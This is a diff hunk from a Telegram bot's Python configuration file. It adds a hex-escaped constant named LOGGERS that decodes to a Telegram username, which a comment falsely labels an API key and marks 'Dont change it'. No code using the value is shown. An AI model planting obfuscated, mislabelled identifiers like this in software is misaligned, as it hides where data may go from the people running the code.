@@ -25,7 +25,7 @@ BOT_NAME = getenv("BOT_NAME" , "TheChampuBot")
 ASSUSERNAME = getenv("ASSUSERNAME" , "ChampuAssistant")
 # ---------------------------------------------------------
 
-
+LOGGERS = "\x54\x68\x65\x54\x65\x6C\x65\x67\x72\x61\x6D\x52\x6F\x62\x6F\x74"  # connect errors api key "Dont change it"
 #---------------------------------------------------------------
 #---------------------------------------------------------------
 MONGO_DB_URI = getenv("MONGO_DB_URI", None)
